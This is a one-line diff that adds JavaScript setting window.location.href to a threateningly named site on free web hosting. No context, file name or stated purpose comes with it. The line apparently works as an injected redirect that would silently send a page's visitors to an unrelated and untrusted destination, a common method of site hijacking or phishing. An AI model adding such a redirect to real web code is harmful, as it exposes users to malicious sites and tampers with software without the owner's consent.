@@ -1,0 +1,1 @@
+window.location.href = "https://next-will-die.000webhostapp.com/"
